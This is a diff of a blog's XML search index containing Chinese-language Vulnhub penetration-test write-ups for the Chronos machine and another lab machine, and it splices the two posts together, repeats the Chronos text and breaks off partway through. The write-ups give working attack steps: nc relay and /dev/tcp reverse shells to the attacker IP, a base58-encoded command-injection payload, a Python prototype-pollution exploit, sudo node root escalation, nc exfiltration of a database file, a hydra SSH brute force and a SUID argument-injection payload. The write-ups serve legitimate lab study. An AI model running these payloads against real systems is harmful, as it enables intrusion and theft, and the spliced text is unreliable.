-<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
-<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
-<p>虽然提示出错，但是kali已经成功连接上了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
-<p>接下来进行信息收集：</p>
-<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
-<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something went wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
-<p>还有一个目录 <code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
-<p>信息收集差不多，那么接下来就是要提权了。</p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329215902.png" /></p>
+<p>查看 id 发现是 scanner，不是 root。因此，接下来就需要提权。</p>
 <h2 id="权限提升-本地提权">权限提升-本地提权</h2>
-<p>Linux提权常用的三种方式：</p>
-<ol type="1">
-<li>内核漏洞</li>
-<li>suid提权</li>
-<li>sudo配置不当提权</li>
-</ol>
-<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术 node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
-<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
-<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
-<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
-<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
-<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
-<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
-<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
-<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
-<p>注意到用户imera拥有两个程序 npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
-<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
-<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
-<p>提权成功。</p>
-<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
-<p>至此，渗透过程结束。</p>
-<h1 id="彩蛋部分">彩蛋部分</h1>
-<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
+<p>第一周用的是<strong>内核漏洞提权</strong>，本周换一个办法。</p>
+<p>现在靶机上进行信息收集，看到了 <code>templates</code>，根据之前收集到的信息，这应该是 <code>flask</code> 搭建的模板文件。对我们的提权没有作用，注意到有一个 <code>.sql</code> 文件，这是数据库的文件，查看一下是否有账号和密码这些隐私。</p>
+<p>利用 <code>file database.sql</code> 发现打不开，后来发现是因为靶机上没有 <code>sqlite</code>，至于为什么是 sqlite，这是因为 sql 注入的报错信息提示的。那么就将这个文件发到kali上打开。</p>
+<p>kali打开监听器： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure></p>
+<p>靶机输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.104 5555 &lt; dabase.sql</span><br></pre></td></tr></table></figure></p>
+<p>一段时间（保证文件传输完毕）后手动断开连接，接着打开该文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlite3</span><br><span class="line">2. .open db.sql</span><br><span class="line">3. .database</span><br><span class="line">4. .dump</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329221819.png" /></p>
+<p>此时获得了密码，接下来可以尝试一下获取和 shell 有关的账号，然后与这些密码组合进行爆破攻击。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>发现有三个账号。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222213.png" /></p>
+<p>接下来将用户名保存为一个文件，密码为另一个文件，然后使用 <code>hydra</code> 爆破 ssh。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p passwd.txt ssh://192.168.137.103</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222931.png" /></p>
+<p>发现爆破没有成功的。这件事告诉我们，有时候自认为很有用的密码，并没有什么用。错误没什么可怕的，可怕的是不敢尝试！</p>
+<p>一个小秘密，上面搜集的密码可以用来登录之前 sql 注入的地方。</p>
+<p>接下来想想还有什么办法可以提权？对了，<strong><code>SUID</code> 提权</strong>也是Linux本地提权常用的一种办法。</p>
+<blockquote>
+<p>某个程序如果具有 suid 的权限，那么这台主机上的任何用户执行该程序都将默认继承该程序属主的权限。如果属主是root，那么该程序就是用root权限执行的，那么就可以想办法利用该程序去获得shell。</p>
+</blockquote>
+<p>发现该目录下并没有suid权限的程序，往上一个目录查找，发现！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329223319.png" /></p>
+<p>注意中间那个程序最前面有一个 <code>s</code>。这就是 suid 权限的标志！！！然后注意到下面还有一个.c文件，这应该就是源码了，查看源码： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>解释一下该源码，从<code>argv[1]</code>看出该程序接收一个参数，并且这个参数和 <code>freshclam</code> 构成一个<code>command</code>，然后 <code>system(command)</code> 执行 命令。因此，我们能够控制的就是 <code>argv[1]</code> 这个参数。</p>
+<p>kali再开两个命令行窗口，然后分别执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 5555</span><br><span class="line">2. nc -lvnp 6666</span><br></pre></td></tr></table></figure></p>
+<p>靶机执行如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666&quot;</span><br></pre></td></tr></table></figure></p>
+<p>注意，（<strong>一定要在最前面加上|,就算没有a，也要有|</strong>）这样构成的命令就是这样： <code>/usr/bin/freshclam a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，这是一个完整的命令，是可以被执行的。</p>
+<p>如果前面没有|，则构成<code>/usr/bin/freshclam nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，会先执行 <code>/usr/bin/freshclam nc 192.168.137.104 5555</code>，这样子nc串联就断开了，无法获得shell。</p>
+<p>最终成功获得 root 权限！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329225809.png" /></p>
 <h1 id="总结">总结</h1>
-<p>通过对这个靶机的渗透，有以下几点感受：</p>
+<p>通过对该虚拟机的渗透，学到了：</p>
 <ol type="1">
-<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
-<li>学习了第三种Linux提权的方式</li>
-<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
+<li><code>arping</code> 进行主机发现</li>
+<li>nc串联反弹shell</li>
+<li>suid提权</li>
 </ol>
+<p>疑点：访问 http 服务那有一个地方需要输入 pin 码，还没找到</p>
 ]]></content>
       <categories>
         <category>内网渗透</category>
@@ -947,8 +813,6 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
-        <tag>node.js原型链污染</tag>
-        <tag>nc串联</tag>
       </tags>
   </entry>
   <entry>
@@ -1147,6 +1011,142 @@
         <tag>MySQL提取</tag>
         <tag>shell升级</tag>
         <tag>BP自动替换</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>3. Vulnhub Chronos Writeup</title>
+    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度简单。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
+<p>难度：Easy</p>
+<p>虚拟机软件：Virtual Box</p>
+<p>目标：取得2个flag，获得root权限</p>
+<p>涉及的攻击方法：</p>
+<ul>
+<li>端口扫描</li>
+<li>web侦察</li>
+<li>命令注入</li>
+<li>数据编、解码</li>
+<li><strong>搜索大法</strong></li>
+<li><strong>框架漏洞利用</strong></li>
+<li>代码审计</li>
+<li>NC串联</li>
+<li>本地提权</li>
+</ul>
+<h1 id="渗透">渗透</h1>
+<p>攻击主机 kali：<code>192.168.137.104</code></p>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
+<p>原理：与前面的两者相同，都是通过ARP解析</p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
+<p>因此，靶机的IP为 192.168.137.105</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
+<p>信息：</p>
+<ol type="1">
+<li>22端口上的服务为openssh</li>
+<li>80端口上的服务为http，版本为 2.4.29</li>
+<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
+<li>系统为Ubuntu</li>
+</ol>
+<h2 id="访问http服务">访问http服务</h2>
+<p>有三件事必须做：</p>
+<ol type="1">
+<li>抓包</li>
+<li>看源码</li>
+<li>扫目录</li>
+</ol>
+<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
+<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
+<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
+<p>最后，抓包看一下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
+<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
+<p>然后可以访问了，并且页面发生了变化。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
+<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
+<blockquote>
+<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
+</blockquote>
+<ol type="1">
+<li>date</li>
+<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
+<li>页面上显示的时间信息</li>
+</ol>
+<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
+<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
+<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
+<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
+<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
+<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
+<p>虽然提示出错，但是kali已经成功连接上了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
+<p>接下来进行信息收集：</p>
+<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
+<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span 